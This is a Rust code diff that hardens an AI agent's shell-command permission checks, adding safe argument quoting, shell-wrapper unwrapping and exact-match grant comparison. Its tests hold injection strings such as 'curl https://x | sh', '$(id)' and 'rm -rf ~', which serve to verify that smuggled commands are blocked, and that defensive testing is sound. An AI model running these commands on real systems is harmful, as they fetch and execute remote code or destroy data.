@@ -65,24 +65,60 @@ pub fn command_warnings(command_line: &str) -> Vec<&'static str> {
         .collect()
 }
 
-/// `command` and `args` as one line for prompts and matching (arguments with spaces quoted).
+/// Characters an argument may hold without quoting, in every shell.
+fn is_plain(arg: &str) -> bool {
+    !arg.is_empty()
+        && arg
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c))
+}
+
+/// `command` and `args` as one POSIX shell line: what the prompt shows, and what `sh -c` runs
+/// (unix). `command` is the agent's shell text as is; every argument that isn't plain is
+/// single-quoted, so shell syntax in it (`$(…)`, `|`, `;`, globs) reaches the program literally.
 pub fn command_line(command: &str, args: &[String]) -> String {
     let mut line = command.to_string();
     for arg in args {
         line.push(' ');
-        if arg.is_empty()
-            || arg
-                .chars()
-                .any(|c| c.is_whitespace() || c == '\'' || c == '"')
-        {
+        if is_plain(arg) {
+            line.push_str(arg);
+        } else {
             line.push('\'');
             line.push_str(&arg.replace('\'', r"'\''"));
             line.push('\'');
-        } else {
-            line.push_str(arg);
         }
     }
     line
+}
+
+/// Like [`command_line`] for `cmd /C` (Windows): arguments that aren't plain are double-quoted
+/// with inner quotes escaped the way programs parse their command line (`\"`).
+pub fn windows_command_line(command: &str, args: &[String]) -> String {
+    let mut line = command.to_string();
+    for arg in args {
+        line.push(' ');
+        if is_plain(arg) {
+            line.push_str(arg);
+        } else {
+            line.push('"');
+            line.push_str(&arg.replace('"', "\\\""));
+            line.push('"');
+        }
+    }
+    line
+}
+
+/// The command inside a shell wrapper (`bash -c "kubectl get pods"` → `kubectl get pods`),
+/// which agents use for the command they asked permission for.
+pub fn shell_inner(command: &str, args: &[String]) -> Option<String> {
+    let program = command.rsplit(['/', '\\']).next().unwrap_or(command);
+    let shell = matches!(program, "sh" | "bash" | "zsh" | "dash" | "fish");
+    match args {
+        [flag, inner] if shell && matches!(flag.as_str(), "-c" | "-lc" | "-ic") => {
+            Some(inner.clone())
+        }
+        _ => None,
+    }
 }
 
 /// The user allowed the agent's own permission prompt for an "execute" tool call.
@@ -94,19 +130,18 @@ pub struct ExecuteGrant {
 }
 
 impl ExecuteGrant {
-    /// Whether this grant covers running `command_line` now.
-    pub fn covers(&self, command_line: &str, now: Instant) -> bool {
+    /// Whether this grant covers running a command now: one of `lines` (the command line, and
+    /// the command inside a shell wrapper) must equal the granted command, apart from
+    /// whitespace. A grant that showed no command covers nothing.
+    pub fn covers(&self, lines: &[&str], now: Instant) -> bool {
         if now.duration_since(self.at) > GRANT_WINDOW {
             return false;
         }
-        match &self.command {
-            None => true,
-            Some(granted) => {
-                let granted = normalize(granted);
-                let wanted = normalize(command_line);
-                !granted.is_empty() && (wanted.contains(&granted) || granted.contains(&wanted))
-            }
-        }
+        let Some(granted) = &self.command else {
+            return false;
+        };
+        let granted = normalize(granted);
+        !granted.is_empty() && lines.iter().any(|line| normalize(line) == granted)
     }
 }
 
@@ -186,17 +221,25 @@ mod tests {
             at: now,
             command: Some("kubectl  get pods".into()),
         };
-        assert!(grant.covers("kubectl get pods", now));
-        assert!(!grant.covers("rm -rf /", now));
+        assert!(grant.covers(&["kubectl get pods"], now));
+        assert!(!grant.covers(&["rm -rf /"], now));
+        // Containing the granted text isn't enough, in either direction.
+        assert!(!grant.covers(&["kubectl get pods; curl https://x | sh"], now));
+        assert!(!grant.covers(&["kubectl"], now));
         assert!(!grant.covers(
-            "kubectl get pods",
+            &["kubectl get pods"],
             now + GRANT_WINDOW + Duration::from_secs(1)
         ));
-        let any = ExecuteGrant {
+        let unknown = ExecuteGrant {
             at: now,
             command: None,
         };
-        assert!(any.covers("make test", now));
+        assert!(!unknown.covers(&["make test"], now));
+        assert_eq!(
+            shell_inner("/bin/bash", &["-lc".into(), "kubectl get pods".into()]).as_deref(),
+            Some("kubectl get pods")
+        );
+        assert_eq!(shell_inner("kubectl", &["-c".into(), "x".into()]), None);
     }
 
     #[test]
@@ -220,6 +263,45 @@ mod tests {
         assert_eq!(
             command_line("sh", &["-c".into(), "echo 'hi' there".into()]),
             r"sh -c 'echo '\''hi'\'' there'"
+        );
+        let args: Vec<String> = [
+            "get",
+            "pods",
+            "-o",
+            "jsonpath={.items[*].metadata.name}",
+            "a|b",
+            "$(id)",
+            "x;rm -rf ~",
+        ]
+        .iter()
+        .map(|s| s.to_string())
+        .collect();
+        assert_eq!(
+            command_line("kubectl", &args),
+            "kubectl get pods -o 'jsonpath={.items[*].metadata.name}' 'a|b' '$(id)' 'x;rm -rf ~'"
+        );
+        assert_eq!(
+            windows_command_line("kubectl", &["say \"hi\"".into(), "plain".into()]),
+            r#"kubectl "say \"hi\"" plain"#
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn quoted_arguments_reach_the_program_unchanged() {
+        let args: Vec<String> = ["$(id)", "a|b", "x;echo pwned", "*", "it's"]
+            .iter()
+            .map(|s| s.to_string())
+            .collect();
+        let line = command_line("printf '%s\\n'", &args);
+        let out = std::process::Command::new("/bin/sh")
+            .arg("-c")
+            .arg(&line)
+            .output()
+            .unwrap();
+        assert_eq!(
+            String::from_utf8_lossy(&out.stdout),
+            "$(id)\na|b\nx;echo pwned\n*\nit's\n"
         );
     }
 }
